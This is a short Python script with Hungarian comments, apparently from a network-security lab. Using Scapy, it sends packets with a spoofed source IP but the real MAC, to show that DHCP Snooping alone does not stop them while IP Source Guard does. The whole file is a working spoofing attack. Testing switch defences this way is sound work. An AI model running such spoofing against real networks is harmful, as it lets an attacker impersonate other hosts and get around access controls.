#!/usr/bin/env python3
"""Hamis forrás-IP-jű csomagok injektálása.
Fontos: a keret a támadó VALÓDI MAC-jét hordozza, de hamis forrás-IP-t —
a DHCP Snooping önmagában nem fogja meg, csak az IP Source Guard.

Futtatás: sudo python3 ip_spoof.py eth0 10.10.10.50 [dst]
"""
import sys, time
from scapy.all import Ether, IP, UDP, sendp, conf

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    spoofed = sys.argv[2] if len(sys.argv) > 2 else "10.10.10.50"
    dst = sys.argv[3] if len(sys.argv) > 3 else "10.10.10.1"
    conf.iface = iface
    pkt = (Ether(src=conf.iface.mac, dst="ff:ff:ff:ff:ff:ff") /
           IP(src=spoofed, dst=dst, ttl=64) / UDP(sport=44444, dport=53))
    print(f"[*] Spoofolt csomagok: forrás-IP={spoofed}, valós MAC={conf.iface.mac}")
    for _ in range(10):
        sendp(pkt, verbose=0)
        time.sleep(0.2)
    print(f"[!] 10 csomag elküldve. Nézd: 'show ip verify source' — a DHCP snooping "
          f"binding-táblában NEM szerepelhet a {spoofed} cím.")

if __name__ == "__main__":
    main()
